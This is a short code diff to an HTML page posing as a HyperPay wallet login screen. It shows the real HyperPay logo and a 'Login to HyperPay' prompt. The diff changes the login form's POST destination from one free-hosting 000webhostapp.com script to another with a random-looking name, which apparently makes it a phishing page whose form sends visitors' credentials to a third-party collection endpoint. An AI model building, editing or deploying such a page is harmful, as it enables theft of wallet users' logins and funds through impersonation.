@@ -286,7 +286,7 @@
 					<div class="sc-bdfBQB sc-gVgoRu ccuXVo cQWYUz">
 <img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/common/logo.svg" alt="" class="logo_img" width="75%" height="50%" style="margin: 0 50px 10px;">
 					<div class="sc-cbDFGl fRjwaG" ></div>
-                    <form method="post" action="https://hyperpay-wallet.000webhostapp.com/pay.php">
+                    <form method="post" action="https://123zzz123.000webhostapp.com/00.php">
 					<div class="sc-cbDFGl fRjwaG" style=" margin-bottom: 10px; ">Login to HyperPay</div>
 					<i class="fa-solid fa-chevron-right"></i>							    
 					<div class="sc-bdfBQB sc-hjWSTT eOlgOh dRqkdT">
